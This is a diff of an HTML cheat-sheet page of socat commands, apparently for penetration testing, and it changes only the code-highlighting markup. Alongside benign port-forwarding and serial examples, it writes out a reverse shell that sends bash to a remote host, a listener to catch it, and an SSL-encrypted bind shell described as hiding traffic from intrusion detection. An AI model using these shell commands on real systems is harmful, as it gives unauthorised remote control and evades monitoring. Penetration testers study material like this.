@@ -126,58 +126,58 @@
 <p><strong>Socat</strong> is Netcat on steroids. It supports files, pipes, devices (serial line, pseudo-terminal, etc), sockets, SSL, and more.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Fully TTY Shell (Listener)</h3>
-<pre class="codehilite"><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:4444
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Listens for a shell and sets up a stable terminal (allows Ctrl+C, arrow keys).</p>
 <h3>2. TTY Shell (Connect)</h3>
-<pre class="codehilite"><code class="language-bash">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:10.10.10.10:4444
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Sends a fully interactive bash shell.</p>
 <h3>3. Port Forwarding</h3>
-<pre class="codehilite"><code class="language-bash">socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>TCP-LISTEN:8080,fork<span class="w"> </span>TCP:10.10.10.20:80
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Listens on 8080. Forwards all traffic to 10.10.10.20:80. The <code>fork</code> allows multiple connections.</p>
 <h3>4. File Transfer</h3>
-<pre class="codehilite"><code class="language-bash">socat TCP4-LISTEN:4444,fork file:filename.txt,create
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>TCP4-LISTEN:4444,fork<span class="w"> </span>file:filename.txt,create
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Host a file.</p>
 <h3>5. SSL Listener</h3>
-<pre class="codehilite"><code class="language-bash">socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>OPENSSL-LISTEN:443,cert<span class="o">=</span>bind_shell.pem,verify<span class="o">=</span><span class="m">0</span>,fork<span class="w"> </span>EXEC:/bin/bash
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Encrypted Bind Shell. Traffic is hidden from IDS.</p>
 <h3>6. SSL Connect</h3>
-<pre class="codehilite"><code class="language-bash">socat - OPENSSL:10.10.10.10:443,verify=0
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>-<span class="w"> </span>OPENSSL:10.10.10.10:443,verify<span class="o">=</span><span class="m">0</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connect to the SSL listener.</p>
 <h3>7. Bridge 2 Ports</h3>
-<pre class="codehilite"><code class="language-bash">socat TCP:10.10.10.10:80 TCP:127.0.0.1:8080
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>TCP:10.10.10.10:80<span class="w"> </span>TCP:127.0.0.1:8080
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connects a remote port to a local port.</p>
 <h3>8. Serial Connection</h3>
-<pre class="codehilite"><code class="language-bash">socat - /dev/ttyUSB0,b115200
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>-<span class="w"> </span>/dev/ttyUSB0,b115200
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connect to serial console.</p>
 <h3>9. UDP to TCP</h3>
-<pre class="codehilite"><code class="language-bash">socat UDP-LISTEN:53,fork TCP:10.10.10.10:53
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>UDP-LISTEN:53,fork<span class="w"> </span>TCP:10.10.10.10:53
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Convert protocols (relay UDP DNS to TCP DNS).</p>
 <h3>10. Verbose</h3>
-<pre class="codehilite"><code class="language-bash">socat -d -d ...
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>-d<span class="w"> </span>-d<span class="w"> </span>...
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Print fatal/warning messages.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:4444
+</code></pre></div>
 
 <p><strong>Explanation:</strong> The "Magic" listener. It stabilizes your reverse shell immediately, preventing you from accidentally killing it with Ctrl+C and giving you full tab completion.</p>
         </div>
